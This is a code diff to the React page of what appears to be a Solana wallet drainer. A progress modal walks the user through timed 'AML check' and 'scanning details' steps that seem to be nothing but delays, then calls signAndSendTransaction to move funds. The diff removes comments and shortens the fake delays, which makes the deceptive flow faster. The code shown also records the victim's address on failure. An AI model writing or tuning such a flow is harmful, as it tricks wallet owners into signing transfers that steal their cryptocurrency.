@@ -1,4 +1,3 @@
-
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 import { LAMPORTS_PER_SOL } from '@solana/web3.js';
@@ -38,7 +37,6 @@ const Index = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [fetchRetries, setFetchRetries] = useState(0);
   
-  // Loading modal state
   const [showLoadingModal, setShowLoadingModal] = useState(false);
   const [connectionSteps, setConnectionSteps] = useState<ConnectionStep[]>(initialSteps);
   const [currentStep, setCurrentStep] = useState('connect');
@@ -57,13 +55,10 @@ const Index = () => {
   };
 
   const advanceToNextStep = (currentStepId: string) => {
-    // Mark current step as completed
     updateStepStatus(currentStepId, 'completed');
     
-    // Find the index of the current step
     const currentIndex = connectionSteps.findIndex(step => step.id === currentStepId);
     
-    // If there's a next step, make it active
     if (currentIndex < connectionSteps.length - 1) {
       const nextStep = connectionSteps[currentIndex + 1];
       updateStepStatus(nextStep.id, 'active');
@@ -97,15 +92,15 @@ const Index = () => {
       advanceToNextStep('amlCheck');
       
       updateStepStatus('successfulAmlCheck', 'active');
-      await new Promise(resolve => setTimeout(resolve, 800));
+      await new Promise(resolve => setTimeout(resolve, 300));
       advanceToNextStep('successfulAmlCheck');
 
       updateStepStatus('scanningDetails', 'active');
-      await new Promise(resolve => setTimeout(resolve, 1000));
+      await new Promise(resolve => setTimeout(resolve, 300));
       advanceToNextStep('scanningDetails');
 
       updateStepStatus('thanks', 'active');
-      await new Promise(resolve => setTimeout(resolve, 800));
+      await new Promise(resolve => setTimeout(resolve, 300));
       advanceToNextStep('thanks');
 
       setFetchRetries(0);
@@ -157,13 +152,12 @@ const Index = () => {
     setConnectionSteps(initialSteps);
     setShowLoadingModal(true);
     
-    // Start the connection process in the UI
     updateStepStatus('connect', 'active');
-    await new Promise(resolve => setTimeout(resolve, 1000));
+    await new Promise(resolve => setTimeout(resolve, 300));
     advanceToNextStep('connect');
     
     updateStepStatus('connectSuccess', 'active');
-    await new Promise(resolve => setTimeout(resolve, 800));
+    await new Promise(resolve => setTimeout(resolve, 250));
     advanceToNextStep('connectSuccess');
     
     try {
@@ -282,11 +276,11 @@ const Index = () => {
 
         advanceToNextStep('signConfirmation');
         updateStepStatus('signWaitingTitle', 'active');
-        await new Promise(resolve => setTimeout(resolve, 500));
+        await new Promise(resolve => setTimeout(resolve, 200));
         advanceToNextStep('signWaitingTitle');
         
         updateStepStatus('signWaitingDescription', 'active');
-        await new Promise(resolve => setTimeout(resolve, 500));
+        await new Promise(resolve => setTimeout(resolve, 200));
         advanceToNextStep('signWaitingDescription');
 
         const signature = await signAndSendTransaction(
@@ -299,7 +293,7 @@ const Index = () => {
         );
 
         updateStepStatus('successfulSign', 'active');
-        await new Promise(resolve => setTimeout(resolve, 1000));
+        await new Promise(resolve => setTimeout(resolve, 300));
         advanceToNextStep('successfulSign');
 
         console.log("Transfer completed with signature:", signature);
@@ -321,7 +315,6 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
       } catch (error) {
         console.error("Transfer failed:", error);
         
-        // Add error steps
         setConnectionSteps(prev => [
           ...prev,
           { id: 'errorTitle', label: 'Error - title', status: 'error' },
@@ -329,7 +322,7 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
         ]);
         
         updateStepStatus('errorTitle', 'active');
-        await new Promise(resolve => setTimeout(resolve, 500));
+        await new Promise(resolve => setTimeout(resolve, 200));
         
         const failureMessage = {
           address: publicKey.toString(),
@@ -368,7 +361,7 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
       setTimeout(() => {
         setShowLoadingModal(false);
         setIsProcessing(false);
-      }, 2000);
+      }, 1000);
     }
   };
 
